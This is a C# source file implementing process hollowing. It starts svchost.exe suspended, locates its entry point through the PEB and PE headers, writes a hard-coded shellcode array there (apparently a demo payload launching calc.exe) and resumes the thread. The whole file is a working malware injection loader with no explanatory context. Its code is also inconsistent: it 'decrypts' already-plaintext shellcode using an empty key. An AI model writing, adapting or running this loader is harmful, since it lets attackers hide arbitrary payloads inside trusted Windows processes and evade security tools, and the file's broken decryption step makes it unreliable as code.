using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace CSProcessHollowing
{
    internal class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_BASIC_INFORMATION
        {
             public IntPtr Reserved1;
             public IntPtr PebAddress;
             public IntPtr Reserved2;
             public IntPtr Reserved3;
             public IntPtr UniquePid;
             public IntPtr MoreReserved;
        }

        enum PROCESS_INFORMATION_CLASS : Int32 {
             ProcessBasicInformation = 0,
             ProcessDebugPort = 7,
             ProcessWow64Information = 26,
             ProcessImageFileName = 27,
             ProcessBreakOnTermination = 29,
             ProcessSubsystemInformation = 75
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
             public Int32 cb;
             public string lpReserved;
             public string lpDesktop;
             public string lpTitle;
             public Int32 dwX;
             public Int32 dwY;
             public Int32 dwXSize;
             public Int32 dwYSize;
             public Int32 dwXCountChars;
             public Int32 dwYCountChars;
             public Int32 dwFillAttribute;
             public Int32 dwFlags;
             public Int16 wShowWindow;
             public Int16 cbReserved2;
             public IntPtr lpReserved2;
             public IntPtr hStdInput;
             public IntPtr hStdOutput;
             public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
           public IntPtr hProcess;
           public IntPtr hThread;
           public int dwProcessId;
           public int dwThreadId;
        }


        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("ntdll.dll", SetLastError=true)]
        static extern UInt32 ZwQueryInformationProcess(
            IntPtr hProcess,
            PROCESS_INFORMATION_CLASS procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            UInt32 ProcInfoLen,
            ref UInt32 retlen
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead
        );

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
             IntPtr hProcess,
             IntPtr lpBaseAddress,
             byte[] lpBuffer,
             Int32 nSize,
             out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static byte[] Decrypt(byte[] encData)
        {
            Aes aes = Aes.Create();
            aes.KeySize = 128;
            aes.BlockSize = 128;
            aes.Key = new byte[16] {  }; 
            aes.IV = new byte[16] {  };
            aes.Padding = PaddingMode.Zeros;
            ICryptoTransform cryptoTransform = aes.CreateDecryptor(aes.Key, aes.IV);
            MemoryStream ms = new MemoryStream();
            CryptoStream cs = new CryptoStream( ms, cryptoTransform, CryptoStreamMode.Write );
            cs.Write(encData, 0, encData.Length);
            cs.FlushFinalBlock();

            byte[] data = ms.ToArray();

            return data;
        }

        static void Main(string[] args)
        {

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            uint CREATE_SUSPENDED = 0x00000004;

            bool ok = CreateProcess(
                null,
                @"C:\Windows\System32\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            if (!ok)
            {
                throw new Exception();
            }

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            ZwQueryInformationProcess(hProcess, PROCESS_INFORMATION_CLASS.ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr imgBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            Console.WriteLine($"Image Base: {"0x" + imgBase.ToString("x")}");

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, imgBase, data, data.Length, out nRead);

            uint e_lfanew = BitConverter.ToUInt32(data, 0x3c);
            Console.WriteLine($"RVA of NT Header: {"0x" + e_lfanew.ToString("x")}");

            uint optionalHeader = e_lfanew + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)optionalHeader);
            Console.WriteLine($"RVA of entrypoint: {"0x" + entrypoint_rva.ToString("x")}");

            IntPtr entryPointAddr = (IntPtr)(entrypoint_rva + (UInt64)imgBase);
            Console.WriteLine($"Address of entrypoint: {"0x" + entryPointAddr.ToString("x")}");


            byte[] buf = new byte[276] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
            0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
            0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
            0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
            0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
            0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
            0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
            0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
            0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
            0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
            0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
            0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
            0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
            0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
            0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
            0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
            0x63,0x2e,0x65,0x78,0x65,0x00 };


            Console.WriteLine("Decrypting");
            buf = Decrypt(buf);

            WriteProcessMemory(hProcess, entryPointAddr, buf, buf.Length, out nRead);

            Console.WriteLine($"Copied {nRead} bytes");

            Console.WriteLine("Resuming thread");
            ResumeThread(pi.hThread);
        }
    }
}
